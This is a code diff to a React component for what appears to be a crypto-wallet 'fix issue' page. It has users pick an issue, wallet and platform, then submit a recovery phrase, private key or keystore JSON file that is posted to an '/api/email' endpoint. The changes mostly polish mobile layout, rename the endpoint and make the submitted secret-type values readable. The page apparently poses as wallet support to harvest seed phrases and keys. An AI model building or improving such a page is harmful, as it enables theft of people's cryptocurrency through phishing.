@@ -165,7 +165,6 @@ const platforms: Platform[] = [
     description: 'cant find your platform? Not to worry Select other and enter the details in the form. ' 
   },
 ]
-
 export default function IssuesContent() {
   const [selectedIssue, setSelectedIssue] = useState<string | null>(null)
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
@@ -189,7 +188,7 @@ export default function IssuesContent() {
     }
 
     try {
-      const response = await fetch('/api/auth/email', {
+      const response = await fetch('/api/email', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -219,19 +218,19 @@ export default function IssuesContent() {
   }
 
   return (
-    <div className="space-y-8">
+    <div className="space-y-6 sm:space-y-8">
       <section>
-        <h2 className="text-2xl font-bold mb-4">What issue do you have?</h2>
-        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">What issue do you have?</h2>
+        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
           {issues.map((issue) => (
             <Card 
               key={issue.id} 
               className={`cursor-pointer transition-all ${selectedIssue === issue.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'}`}
               onClick={() => setSelectedIssue(issue.id)}
             >
-              <CardContent className="flex flex-col items-center justify-center p-4 h-full">
+              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4 h-full">
                 <div className="text-purple-600 mb-2">{issue.icon}</div>
-                <h3 className="font-semibold text-center mb-1">{issue.title}</h3>
+                <h3 className="font-semibold text-center mb-1 text-sm sm:text-base">{issue.title}</h3>
                 <p className="text-xs text-gray-500 text-center">{issue.description}</p>
               </CardContent>
             </Card>
@@ -240,8 +239,8 @@ export default function IssuesContent() {
       </section>
 
       <section>
-        <h2 className="text-2xl font-bold mb-4">Which wallet do you use?</h2>
-        <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 lg:grid-cols-6 gap-3">
+        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Which wallet do you use?</h2>
+        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2 sm:gap-3">
           {wallets.map((wallet) => (
             <Card 
               key={wallet.id} 
@@ -250,7 +249,7 @@ export default function IssuesContent() {
             >
               <CardContent className="flex flex-col items-center justify-center p-2">
                 <div className="mb-1">
-                  <Image src={wallet.icon} alt={wallet.name} width={32} height={32} />
+                  <Image src={wallet.icon} alt={wallet.name} width={24} height={24} className="w-6 h-6 sm:w-8 sm:h-8" />
                 </div>
                 <span className="text-xs font-medium text-center">{wallet.name}</span>
               </CardContent>
@@ -260,19 +259,19 @@ export default function IssuesContent() {
       </section>
 
       <section>
-        <h2 className="text-2xl font-bold mb-4">Which platform?</h2>
-        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
+        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Which platform?</h2>
+        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
           {platforms.map((platform) => (
             <Card 
               key={platform.id} 
               className={`cursor-pointer transition-all ${selectedPlatform === platform.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'}`}
               onClick={() => setSelectedPlatform(platform.id)}
             >
-              <CardContent className="flex flex-col items-center justify-center p-4">
+              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                 <div className="mb-2">
-                  <Image src={platform.icon} alt={platform.name} width={40} height={40} />
+                  <Image src={platform.icon} alt={platform.name} width={32} height={32} className="w-8 h-8 sm:w-10 sm:h-10" />
                 </div>
-                <h3 className="font-semibold text-center">{platform.name}</h3>
+                <h3 className="font-semibold text-center text-sm sm:text-base">{platform.name}</h3>
                 <p className="text-xs text-gray-500 text-center mt-1">{platform.description}</p>
               </CardContent>
             </Card>
@@ -283,16 +282,16 @@ export default function IssuesContent() {
       <Dialog open={isFormOpen} onOpenChange={setIsFormOpen}>
         <DialogTrigger asChild>
           <Button 
-            className="w-full mt-8 bg-purple-600 hover:bg-purple-700 text-white" 
+            className="w-full mt-6 sm:mt-8 bg-purple-600 hover:bg-purple-700 text-white" 
             size="lg"
             disabled={!selectedIssue || !selectedWallet || !selectedPlatform}
           >
             Fix
           </Button>
         </DialogTrigger>
-        <DialogContent className="sm:max-w-[425px] bg-white dark:bg-gray-800">
+        <DialogContent className="sm:max-w-[425px] w-[95vw] bg-white dark:bg-gray-800">
           <DialogHeader>
-            <DialogTitle className="text-2xl font-bold text-purple-600 dark:text-purple-400">Fix Issue</DialogTitle>
+            <DialogTitle className="text-xl sm:text-2xl font-bold text-purple-600 dark:text-purple-400">Fix Issue</DialogTitle>
           </DialogHeader>
           <form onSubmit={handleSubmit} className="space-y-4 mt-4">
             <div className="space-y-2">
@@ -317,9 +316,9 @@ export default function IssuesContent() {
                   <SelectValue placeholder="Choose Connection method" />
                 </SelectTrigger>
                 <SelectContent className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 shadow-lg rounded-md overflow-hidden">
-                  <SelectItem value="option1" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Phrase</SelectItem>                  
-                  <SelectItem value="option2" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Private Key</SelectItem>
-                  <SelectItem value="option3" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">JSON File</SelectItem>                
+                  <SelectItem value="Phrase" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Phrase</SelectItem>                  
+                  <SelectItem value="Private Key" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Private Key</SelectItem>
+                  <SelectItem value="JSON FILE" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">JSON File</SelectItem>                
                 </SelectContent>
               </Select>
             </div>
@@ -334,13 +333,12 @@ export default function IssuesContent() {
               />
             </div>
             <Button 
-            type="submit" 
-            className="w-full bg-purple-600 hover:bg-purple-700 text-white transition-colors duration-200"
-            disabled={isSubmitting}
-          >
-            {isSubmitting ? 'Submitting...' : 'Submit'}
-          </Button>
-
+              type="submit" 
+              className="w-full bg-purple-600 hover:bg-purple-700 text-white transition-colors duration-200"
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? 'Submitting...' : 'Submit'}
+            </Button>
           </form>
         </DialogContent>
       </Dialog>
